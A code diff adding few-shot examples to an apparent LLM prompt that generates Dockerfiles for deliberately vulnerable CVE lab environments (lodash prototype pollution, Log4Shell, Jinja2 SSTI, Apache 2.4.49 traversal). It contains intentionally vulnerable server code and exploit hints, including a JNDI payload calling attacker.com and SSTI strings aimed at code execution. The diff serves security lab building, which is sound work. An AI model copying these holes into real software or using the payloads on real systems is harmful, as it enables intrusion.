@@ -1,6 +1,6 @@
 /**
  * Dockerfile generation tool definitions for LLM
- * Stage 2 of the pipeline: Recipe → Dockerfile
+ * Stage 2 of the pipeline: Recipe -> Dockerfile
  */
 
 import type { ToolDefinition } from "../types";
@@ -154,7 +154,277 @@ Rate your confidence 0-100 that this Dockerfile will create a working, exploitab
 - 0-29: Cannot reliably create a working exploit environment
 
 BE HONEST. If you're unsure about version availability, setup complexity, or exploitability, say so.
-Low confidence is better than wasted build attempts. We will skip retries for low-confidence Dockerfiles.`;
+Low confidence is better than wasted build attempts. We will skip retries for low-confidence Dockerfiles.
+
+=== FEW-SHOT EXAMPLES ===
+
+The following examples show CORRECT and INCORRECT approaches. Study them carefully.
+
+---
+## EXAMPLE 1: React App with Vulnerable Dependency (CORRECT)
+
+**Scenario:** Create a lab for a prototype pollution vulnerability in lodash < 4.17.12
+
+**CORRECT Output:**
+
+Dockerfile:
+\`\`\`dockerfile
+FROM node:16-alpine
+
+LABEL cve="CVE-2019-10744"
+LABEL software="lodash"
+LABEL version="4.17.11"
+
+WORKDIR /app
+
+# Copy package files first for better caching
+COPY package.json ./
+
+# Install dependencies
+RUN npm install
+
+# Copy application source
+COPY server.js ./
+
+EXPOSE 3000
+
+# Health check
+HEALTHCHECK --interval=30s --timeout=3s CMD wget -q --spider http://localhost:3000/health || exit 1
+
+CMD ["node", "server.js"]
+\`\`\`
+
+sourceFiles:
+\`\`\`json
+[
+  {
+    "filename": "package.json",
+    "content": "{\n  \"name\": \"lodash-vuln-lab\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": {\n    \"lodash\": \"4.17.11\",\n    \"express\": \"^4.18.0\"\n  }\n}"
+  },
+  {
+    "filename": "server.js",
+    "content": "const express = require('express');\nconst _ = require('lodash');\n\nconst app = express();\napp.use(express.json());\n\n// Health check endpoint\napp.get('/health', (req, res) => res.send('OK'));\n\n// VULNERABLE: User input passed directly to lodash merge\napp.post('/merge', (req, res) => {\n  const target = {};\n  // CVE-2019-10744: Prototype pollution via merge\n  _.merge(target, req.body);\n  res.json({ result: target, polluted: ({}).polluted });\n});\n\napp.listen(3000, () => console.log('Vulnerable server on :3000'));\n"
+  }
+]
+\`\`\`
+
+exploitHint: "Send POST to /merge with body: {\"__proto__\": {\"polluted\": \"yes\"}}. Check response - if 'polluted' field appears, prototype pollution succeeded."
+
+**WHY THIS IS CORRECT:**
+1. [OK] package.json is in sourceFiles (referenced by COPY)
+2. [OK] server.js is in sourceFiles (referenced by COPY)
+3. [OK] Exact vulnerable version (4.17.11) specified
+4. [OK] Minimal but functional app that exposes the vulnerability
+5. [OK] Health check included
+6. [OK] Clear exploit instructions
+
+---
+## EXAMPLE 1: React App with Vulnerable Dependency (INCORRECT)
+
+**INCORRECT Output - Missing sourceFiles:**
+
+Dockerfile:
+\`\`\`dockerfile
+FROM node:16-alpine
+WORKDIR /app
+COPY package.json ./
+COPY server.js ./
+RUN npm install
+CMD ["node", "server.js"]
+\`\`\`
+
+sourceFiles: [] <!-- WRONG! Files referenced but not provided -->
+
+**WHY THIS FAILS:**
+1. [FAIL] COPY package.json - but package.json NOT in sourceFiles -> Build fails: "COPY failed: file not found"
+2. [FAIL] COPY server.js - but server.js NOT in sourceFiles -> Build fails
+3. [FAIL] No health check
+4. [FAIL] No labels
+
+---
+## EXAMPLE 2: Java Log4j Application (CORRECT)
+
+**Scenario:** Create Log4Shell (CVE-2021-44228) lab
+
+**CORRECT Output:**
+
+Dockerfile:
+\`\`\`dockerfile
+FROM openjdk:8-jdk-slim
+
+LABEL cve="CVE-2021-44228"
+LABEL software="Apache Log4j2"
+LABEL version="2.14.1"
+
+WORKDIR /app
+
+# Install curl for downloading JARs
+RUN apt-get update && apt-get install -y --no-install-recommends curl && rm -rf /var/lib/apt/lists/*
+
+# Download vulnerable Log4j version
+RUN mkdir -p lib && \\
+    curl -sL -o lib/log4j-core-2.14.1.jar https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar && \\
+    curl -sL -o lib/log4j-api-2.14.1.jar https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar
+
+# Copy and compile application
+COPY VulnerableApp.java .
+RUN javac -cp "lib/*" VulnerableApp.java
+
+EXPOSE 8080
+
+HEALTHCHECK --interval=10s --timeout=3s CMD curl -f http://localhost:8080/ || exit 1
+
+CMD ["java", "-cp", ".:lib/*", "VulnerableApp"]
+\`\`\`
+
+sourceFiles:
+\`\`\`json
+[
+  {
+    "filename": "VulnerableApp.java",
+    "content": "import com.sun.net.httpserver.HttpServer;\nimport com.sun.net.httpserver.HttpHandler;\nimport com.sun.net.httpserver.HttpExchange;\nimport org.apache.logging.log4j.LogManager;\nimport org.apache.logging.log4j.Logger;\nimport java.io.*;\nimport java.net.InetSocketAddress;\n\npublic class VulnerableApp {\n    private static final Logger logger = LogManager.getLogger(VulnerableApp.class);\n\n    public static void main(String[] args) throws Exception {\n        HttpServer server = HttpServer.create(new InetSocketAddress(8080), 0);\n        server.createContext(\"/\", new VulnerableHandler());\n        server.start();\n        System.out.println(\"Server started on port 8080\");\n    }\n\n    static class VulnerableHandler implements HttpHandler {\n        public void handle(HttpExchange exchange) throws IOException {\n            String userAgent = exchange.getRequestHeaders().getFirst(\"User-Agent\");\n            // VULNERABLE: User input logged directly - triggers JNDI lookup\n            logger.info(\"Request from: \" + userAgent);\n            \n            String response = \"Hello! Your User-Agent was logged.\";\n            exchange.sendResponseHeaders(200, response.length());\n            try (OutputStream os = exchange.getResponseBody()) {\n                os.write(response.getBytes());\n            }\n        }\n    }\n}\n"
+  }
+]
+\`\`\`
+
+exploitHint: "Send request with User-Agent header: \${jndi:ldap://attacker.com/exploit}. Monitor for DNS/LDAP callback to confirm RCE."
+
+**WHY THIS IS CORRECT:**
+1. [OK] VulnerableApp.java provided in sourceFiles
+2. [OK] Downloads exact vulnerable Log4j version (2.14.1)
+3. [OK] Minimal HTTP server that logs user input
+4. [OK] Clear exploit path via User-Agent header
+
+---
+## EXAMPLE 2: Java Log4j Application (INCORRECT)
+
+**INCORRECT Output - Wrong version, missing files:**
+
+Dockerfile:
+\`\`\`dockerfile
+FROM openjdk:11
+WORKDIR /app
+RUN apt-get update && apt-get install -y maven
+COPY pom.xml .
+COPY src/ ./src/
+RUN mvn package
+CMD ["java", "-jar", "target/app.jar"]
+\`\`\`
+
+sourceFiles:
+\`\`\`json
+[
+  {
+    "filename": "pom.xml",
+    "content": "<project>...</project>"
+  }
+]
+\`\`\`
+
+**WHY THIS FAILS:**
+1. [FAIL] COPY src/ - but src/ directory NOT in sourceFiles -> Build fails
+2. [FAIL] Uses Maven which adds complexity and potential network failures
+3. [FAIL] pom.xml doesn't specify vulnerable Log4j version
+4. [FAIL] OpenJDK 11+ has some mitigations, should use OpenJDK 8
+
+---
+## EXAMPLE 3: Python Flask SSTI (CORRECT)
+
+**Scenario:** Server-Side Template Injection in Jinja2
+
+**CORRECT Output:**
+
+Dockerfile:
+\`\`\`dockerfile
+FROM python:3.9-slim
+
+LABEL vulnerability="SSTI"
+LABEL software="Flask/Jinja2"
+
+WORKDIR /app
+
+COPY requirements.txt .
+RUN pip install --no-cache-dir -r requirements.txt
+
+COPY app.py .
+
+EXPOSE 5000
+
+HEALTHCHECK --interval=10s --timeout=3s CMD curl -f http://localhost:5000/ || exit 1
+
+CMD ["python", "app.py"]
+\`\`\`
+
+sourceFiles:
+\`\`\`json
+[
+  {
+    "filename": "requirements.txt",
+    "content": "flask==2.0.0\nJinja2==3.0.0"
+  },
+  {
+    "filename": "app.py",
+    "content": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    name = request.args.get('name', 'World')\n    # VULNERABLE: User input directly in template\n    template = f'<h1>Hello {name}!</h1>'\n    return render_template_string(template)\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)\n"
+  }
+]
+\`\`\`
+
+exploitHint: "Visit /?name={{config}} to leak config. For RCE: /?name={{''.__class__.__mro__[1].__subclasses__()}}"
+
+---
+## EXAMPLE 4: Apache httpd Path Traversal (CORRECT vs INCORRECT)
+
+**CORRECT - Using official image with sed:**
+\`\`\`dockerfile
+FROM httpd:2.4.49
+
+RUN sed -i 's/#LoadModule cgid_module/LoadModule cgid_module/' /usr/local/apache2/conf/httpd.conf
+RUN echo '<Directory />' >> /usr/local/apache2/conf/httpd.conf && \\
+    echo '    Require all granted' >> /usr/local/apache2/conf/httpd.conf && \\
+    echo '</Directory>' >> /usr/local/apache2/conf/httpd.conf
+
+EXPOSE 80
+CMD ["httpd-foreground"]
+\`\`\`
+sourceFiles: [] <!-- Correct! No source files needed for config-only changes -->
+
+**INCORRECT - Replacing config file:**
+\`\`\`dockerfile
+FROM httpd:2.4.49
+COPY httpd.conf /usr/local/apache2/conf/httpd.conf  <!-- WRONG! -->
+EXPOSE 80
+CMD ["httpd-foreground"]
+\`\`\`
+
+**WHY THE INCORRECT VERSION FAILS:**
+1. [FAIL] Replacing httpd.conf removes critical default settings
+2. [FAIL] httpd.conf not in sourceFiles anyway
+3. [FAIL] Will cause Apache to fail to start with cryptic errors
+
+---
+## COMMON MISTAKES TO AVOID
+
+| Mistake | Why It Fails | Fix |
+|---------|--------------|-----|
+| COPY file without sourceFiles entry | Build error: file not found | Add file to sourceFiles array |
+| Using :latest tag | Version may not be vulnerable | Use exact vulnerable version |
+| Building from source when image exists | Slow, error-prone | Use official Docker Hub image |
+| Replacing config files | Breaks default setup | Use sed to modify in-place |
+| Missing HEALTHCHECK | Can't detect if service started | Add appropriate health check |
+| Installing via apt when image exists | Wrong version, slow | Use language-specific image |
+| Complex build steps | More failure points | Keep it minimal |
+
+---
+## CHECKLIST BEFORE SUBMITTING
+
+Before generating output, verify:
+1. [ ] Every file in COPY/ADD commands is in sourceFiles
+2. [ ] Exact vulnerable version specified (not "latest", not ranges)
+3. [ ] Using official Docker image if available
+4. [ ] HEALTHCHECK included
+5. [ ] Labels with CVE/version info
+6. [ ] Minimal application that exposes the vulnerability
+7. [ ] Clear exploit instructions`;
 
 /**
  * NVD metadata structure
